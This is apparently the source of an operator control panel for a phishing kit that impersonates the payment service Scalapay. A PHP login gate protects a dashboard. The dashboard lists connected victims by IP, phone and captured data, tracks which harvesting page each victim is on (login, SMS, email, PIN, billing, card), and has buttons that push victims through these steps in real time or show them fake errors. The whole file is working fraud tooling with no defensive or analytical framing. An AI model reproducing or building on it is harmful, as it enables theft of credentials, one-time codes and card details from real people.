<?php
// Simple auth - change this password
$ADMIN_PASS = 'yora';
$authed = false;

if (isset($_POST['pass']) && $_POST['pass'] === $ADMIN_PASS) {
    setcookie('sp_auth', md5($ADMIN_PASS), time() + 86400);
    $authed = true;
} elseif (isset($_COOKIE['sp_auth']) && $_COOKIE['sp_auth'] === md5($ADMIN_PASS)) {
    $authed = true;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>🎛️ Scalapay Control Panel</title>
<style>
:root {
    --bg: #0a0a12; --card: #13131f; --card2: #1a1a2e;
    --accent: #8b5cf6; --accent2: #a78bfa; --green: #22c55e;
    --red: #ef4444; --orange: #f59e0b; --text: #e2e8f0;
    --text2: #64748b; --border: #1e1e2e;
}
* { margin:0; padding:0; box-sizing:border-box; }
body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; }

.header {
    background: linear-gradient(135deg, var(--card2), var(--card));
    padding: 18px 24px; border-bottom: 2px solid var(--accent);
    display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;
}
.header h1 { font-size: 20px; }
.status { display: flex; align-items: center; gap: 16px; font-size: 12px; color: var(--text2); }
.status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
.status-dot.on { background: var(--green); box-shadow: 0 0 6px var(--green); animation: pulse 2s infinite; }
.status-dot.off { background: var(--red); }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }

.container { padding: 18px 24px; max-width: 1600px; margin: 0 auto; }

/* Stats */
.stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; margin-bottom: 18px; }
.stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 12px; text-align: center; }
.stat-card .num { font-size: 22px; font-weight: 700; color: var(--accent); }
.stat-card .label { font-size: 9px; color: var(--text2); margin-top: 3px; text-transform: uppercase; letter-spacing: 1px; }

/* Table */
.section-title { font-size: 14px; margin-bottom: 10px; color: var(--accent2); font-weight: 600; display: flex; align-items: center; gap: 6px; }
.table-wrap { background: var(--card); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin-bottom: 18px; overflow-x: auto; }
.tbl { width: 100%; border-collapse: collapse; font-size: 11px; min-width: 900px; }
.tbl th { background: var(--card2); padding: 10px 8px; text-align: left; font-weight: 600; color: var(--accent2); text-transform: uppercase; font-size: 9px; letter-spacing: 1px; border-bottom: 1px solid var(--border); white-space: nowrap; }
.tbl td { padding: 8px; border-bottom: 1px solid var(--border); vertical-align: middle; white-space: nowrap; }
.tbl tr:hover td { background: rgba(139,92,246,0.04); }
.tbl tr.offline td { opacity: 0.4; }

.cid { font-family: monospace; font-size: 10px; color: var(--accent); background: rgba(139,92,246,0.1); padding: 2px 6px; border-radius: 4px; }
.cip { font-family: monospace; font-size: 9px; color: var(--text2); }
.st { font-size: 10px; }
.st.on { color: var(--green); }
.st.off { color: var(--red); }
.pg { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 9px; font-weight: 600; text-transform: uppercase; }
.pg-login { background: rgba(139,92,246,0.12); color: #a78bfa; }
.pg-sms { background: rgba(59,130,246,0.12); color: #60a5fa; }
.pg-email { background: rgba(16,185,129,0.12); color: #34d399; }
.pg-pin { background: rgba(245,158,11,0.12); color: #fbbf24; }
.pg-billing { background: rgba(236,72,153,0.12); color: #f472b6; }
.pg-card { background: rgba(239,68,68,0.12); color: #f87171; }
.pg-success { background: rgba(34,197,94,0.12); color: #4ade80; }

/* Action buttons per client */
.act-btns { display: flex; gap: 3px; flex-wrap: wrap; }
.act-btn {
    padding: 4px 7px; border: none; border-radius: 5px;
    font-size: 9px; font-weight: 600; cursor: pointer;
    transition: all .15s; text-transform: uppercase;
}
.act-btn:hover { transform: translateY(-1px); filter: brightness(1.15); }
.act-sms { background: #3b82f6; color: #fff; }
.act-email { background: #10b981; color: #fff; }
.act-pin { background: #f59e0b; color: #fff; }
.act-bill { background: #ec4899; color: #fff; }
.act-card { background: #ef4444; color: #fff; }
.act-ok { background: #22c55e; color: #fff; }
.act-err { background: #dc2626; color: #fff; }
.act-email-set { background: var(--accent); color: #fff; }

/* Inputs in table */
.tbl-inp {
    background: var(--bg); border: 1px solid var(--border); border-radius: 5px;
    padding: 4px 6px; color: var(--text); font-size: 10px; width: 100px; outline: none;
}
.tbl-inp:focus { border-color: var(--accent); }

/* Logs */
.logs { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 12px; height: 220px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 10px; }
.log-line { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.02); display: flex; gap: 8px; }
.log-t { color: var(--text2); min-width: 60px; }
.log-type { min-width: 50px; font-weight: 600; }
.log-i { color: var(--accent); }
.log-d { color: var(--green); }
.log-e { color: var(--red); }
.log-w { color: var(--orange); }

/* Toast */
.toast {
    position: fixed; top: 16px; right: 16px; background: var(--card2);
    border: 1px solid var(--accent); border-radius: 10px; padding: 12px 18px;
    transform: translateX(400px); transition: transform .3s ease;
    z-index: 1000; font-size: 12px;
}
.toast.show { transform: translateX(0); }

/* Auth */
.auth-box {
    max-width: 320px; margin: 100px auto; background: var(--card);
    border: 1px solid var(--border); border-radius: 16px; padding: 32px;
    text-align: center;
}
.auth-box h2 { margin-bottom: 20px; color: var(--accent); }
.auth-box input {
    width: 100%; padding: 12px 16px; background: var(--bg); border: 1px solid var(--border);
    border-radius: 10px; color: var(--text); font-size: 14px; outline: none; margin-bottom: 12px;
}
.auth-box input:focus { border-color: var(--accent); }
.auth-box button {
    width: 100%; padding: 12px; background: var(--accent); color: #fff;
    border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer;
}

.empty { text-align: center; padding: 30px; color: var(--text2); font-size: 12px; }

@media (max-width: 768px) {
    .container { padding: 12px; }
    .tbl { font-size: 10px; }
}
</style>
</head>
<body>

<?php if (!$authed): ?>
<div class="auth-box">
    <h2>🔐 Control Panel</h2>
    <form method="POST">
        <input type="password" name="pass" placeholder="Password" autofocus>
        <button type="submit">Enter</button>
    </form>
</div>
<?php else: ?>

<div class="header">
    <h1>🎛️ Scalapay Panel</h1>
    <div class="status">
        <span><span class="status-dot on" id="apiDot"></span> <span id="apiTxt">Live</span></span>
        <span>🟢 <b id="onCount">0</b></span>
        <span>📊 <b id="totCount">0</b></span>
    </div>
</div>

<div class="container">
    <!-- Stats -->
    <div class="stats-grid">
        <div class="stat-card"><div class="num" id="sOn">0</div><div class="label">Online</div></div>
        <div class="stat-card"><div class="num" id="sLogin">0</div><div class="label">Login</div></div>
        <div class="stat-card"><div class="num" id="sSMS">0</div><div class="label">SMS</div></div>
        <div class="stat-card"><div class="num" id="sEmail">0</div><div class="label">Email</div></div>
        <div class="stat-card"><div class="num" id="sPIN">0</div><div class="label">PIN</div></div>
        <div class="stat-card"><div class="num" id="sBill">0</div><div class="label">Billing</div></div>
        <div class="stat-card"><div class="num" id="sCard">0</div><div class="label">Card</div></div>
        <div class="stat-card"><div class="num" id="sOK">0</div><div class="label">Success</div></div>
    </div>

    <!-- Clients -->
    <div class="section-title">👥 Clients (Each row = one client with IP + buttons)</div>
    <div class="table-wrap">
        <table class="tbl">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>IP</th>
                    <th>Status</th>
                    <th>Page</th>
                    <th>Phone</th>
                    <th>Data</th>
                    <th>Redirect</th>
                    <th>Error</th>
                    <th>Email Mask</th>
                </tr>
            </thead>
            <tbody id="tb">
                <tr><td colspan="9"><div class="empty">Waiting for clients to connect...</div></td></tr>
            </tbody>
        </table>
    </div>

    <!-- Logs -->
    <div class="section-title">📜 Logs</div>
    <div class="logs" id="logs"></div>
</div>

<div class="toast" id="toast"></div>

<script>
const API = 'api.php';
let clients = [];
let emailValues = {}; // Store email input values to prevent refresh loss

function req(action, method, data) {
    const o = { method: method };
    if (data && method === 'POST') {
        o.headers = { 'Content-Type': 'application/json' };
        o.body = JSON.stringify(data);
    }
    return fetch(`${API}?action=${action}`, o).then(r => r.json());
}

function load() {
    req('clients', 'GET').then(r => {
        if (r.success) {
            clients = r.clients;
            render();
            stats();
            document.getElementById('apiDot').className = 'status-dot on';
            document.getElementById('apiTxt').textContent = 'Live';
        }
    }).catch(() => {
        document.getElementById('apiDot').className = 'status-dot off';
        document.getElementById('apiTxt').textContent = 'Error';
    });
}

function render() {
    const tb = document.getElementById('tb');
    if (clients.length === 0) {
        tb.innerHTML = '<tr><td colspan="9"><div class="empty">Waiting for clients...</div></td></tr>';
        return;
    }

    tb.innerHTML = clients.map(c => {
        const off = c.status === 'offline' ? 'offline' : '';
        const st = c.status === 'online' ? '<span class="st on">● online</span>' : '<span class="st off">● offline</span>';
        const pg = c.page || 'unknown';
        const dataPreview = Object.entries(c.data || {}).map(([k,v]) => `${k}:${v}`).join(', ');
        // Restore saved email value or use default
        const savedEmail = emailValues[c.id] !== undefined ? emailValues[c.id] : (c.email || '***@**.it');

        return `<tr class="${off}">
            <td><span class="cid">${c.id}</span></td>
            <td><span class="cip">${c.ip}</span></td>
            <td>${st}</td>
            <td><span class="pg pg-${pg}">${pg}</span></td>
            <td>${c.phone || '-'}</td>
            <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;" title="${dataPreview}">${dataPreview || '-'}</td>
            <td>
                <div class="act-btns">
                    <button class="act-btn act-sms" onclick="red('${c.id}','sms')">SMS</button>
                    <button class="act-btn act-email" onclick="red('${c.id}','email')">Email</button>
                    <button class="act-btn act-pin" onclick="red('${c.id}','pin')">PIN</button>
                    <button class="act-btn act-bill" onclick="red('${c.id}','billing')">Bill</button>
                    <button class="act-btn act-card" onclick="red('${c.id}','card')">Card</button>
                    <button class="act-btn act-ok" onclick="red('${c.id}','success')">OK</button>
                </div>
            </td>
            <td>
                <button class="act-btn act-err" onclick="err('${c.id}')">Error</button>
            </td>
            <td>
                <div style="display:flex;gap:3px;">
                    <input class="tbl-inp" id="em-${c.id}" placeholder="chi***@gmail.com" value="${savedEmail}" oninput="saveEmail('${c.id}', this.value)">
                    <button class="act-btn act-email-set" onclick="sem('${c.id}')">Set</button>
                </div>
            </td>
        </tr>`;
    }).join('');
}

function saveEmail(id, value) {
    emailValues[id] = value;
}

function stats() {
    const on = clients.filter(c => c.status === 'online').length;
    document.getElementById('sOn').textContent = on;
    document.getElementById('sLogin').textContent = clients.filter(c => c.page === 'login').length;
    document.getElementById('sSMS').textContent = clients.filter(c => c.page === 'sms').length;
    document.getElementById('sEmail').textContent = clients.filter(c => c.page === 'email').length;
    document.getElementById('sPIN').textContent = clients.filter(c => c.page === 'pin').length;
    document.getElementById('sBill').textContent = clients.filter(c => c.page === 'billing').length;
    document.getElementById('sCard').textContent = clients.filter(c => c.page === 'card').length;
    document.getElementById('sOK').textContent = clients.filter(c => c.page === 'success').length;
    document.getElementById('onCount').textContent = on;
    document.getElementById('totCount').textContent = clients.length;
}

function red(id, target) {
    req('redirect', 'POST', { clientId: id, target: target }).then(() => {
        toast(`🔄 ${id} → ${target}`);
        log(`Redirect ${id} → ${target}`, 'info');
    });
}

function err(id) {
    req('error', 'POST', { clientId: id }).then(() => {
        toast(`⚠️ Error sent to ${id}`);
        log(`Error sent to ${id}`, 'error');
    });
}

function sem(id) {
    const email = document.getElementById('em-' + id).value;
    req('setemail', 'POST', { clientId: id, email: email }).then(() => {
        toast(`✉️ Email set for ${id}: ${email}`);
        log(`Email ${id}: ${email}`, 'info');
    });
}

function log(msg, type) {
    const d = document.getElementById('logs');
    const t = new Date().toLocaleTimeString();
    const el = document.createElement('div');
    el.className = 'log-line';
    el.innerHTML = `<span class="log-t">${t}</span><span class="log-type log-${type[0]}">${type.toUpperCase()}</span><span>${msg}</span>`;
    d.appendChild(el);
    d.scrollTop = d.scrollHeight;
}

function toast(m) {
    const t = document.getElementById('toast');
    t.textContent = m;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2500);
}

load();
setInterval(load, 2000);
</script>

<?php endif; ?>
</body>
</html>